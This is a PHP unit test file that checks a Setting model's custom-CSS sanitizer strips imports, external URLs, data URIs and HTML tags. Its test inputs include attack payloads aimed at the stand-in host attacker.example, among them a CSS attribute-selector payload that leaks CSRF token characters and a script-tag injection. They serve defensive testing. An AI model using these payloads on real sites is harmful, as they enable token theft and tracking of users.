<?php

namespace Tests\Unit\Models;

use App\Models\Setting;
use Tests\TestCase;

class SettingCustomCssTest extends TestCase
{
    private function withCustomCss(string $css): string
    {
        $settings = Setting::getSettings();
        $settings->custom_css = $css;
        $settings->save();

        return $settings->show_custom_css();
    }

    public function test_plain_css_passes_through_unchanged(): void
    {
        $out = $this->withCustomCss('.nav > li { color: #ff0000; }');

        $this->assertStringContainsString('.nav > li', $out);
        $this->assertStringContainsString('#ff0000', $out);
    }

    public function test_double_quoted_selector_survives(): void
    {
        $out = $this->withCustomCss('input[name="_token"] { display: none; }');

        $this->assertStringContainsString('name="_token"', $out);
    }

    public function test_import_at_rule_is_stripped(): void
    {
        $out = $this->withCustomCss('@import url("https://attacker.example/exfil.css");');

        $this->assertStringNotContainsString('@import', $out);
        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_import_at_rule_stripped_case_insensitive(): void
    {
        $out = $this->withCustomCss('@IMPORT "https://attacker.example/exfil.css";');

        $this->assertStringNotContainsString('IMPORT', $out);
        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_external_url_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background: url("https://attacker.example/track.png"); }');

        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_protocol_relative_url_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background: url(//attacker.example/track.png); }');

        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_data_uri_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background: url(data:image/png;base64,AAAA); }');

        $this->assertStringNotContainsString('data:', $out);
    }

    public function test_relative_url_is_preserved(): void
    {
        $out = $this->withCustomCss('.brand { background: url("/uploads/logo.png"); }');

        $this->assertStringContainsString('/uploads/logo.png', $out);
    }

    public function test_html_tags_are_stripped(): void
    {
        $out = $this->withCustomCss('body { color: red; }<script>alert(1)</script>');

        // Inner text ("alert(1)") survives strip_tags but is harmless inside
        // <style>, since the CSS parser skips unrecognized tokens. What
        // matters is that no HTML tag boundary reaches the layout.
        $this->assertStringNotContainsString('<script', $out);
        $this->assertStringNotContainsString('</script', $out);
        $this->assertStringNotContainsString('<', $out);
    }

    public function test_attribute_selector_csrf_exfil_payload_is_neutered(): void
    {
        $payload = 'input[name="_token"][value^="a"] { background: url("https://attacker.example/?t=a"); }';

        $out = $this->withCustomCss($payload);

        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_empty_custom_css_returns_empty_string(): void
    {
        $out = $this->withCustomCss('');

        $this->assertSame('', $out);
    }
}
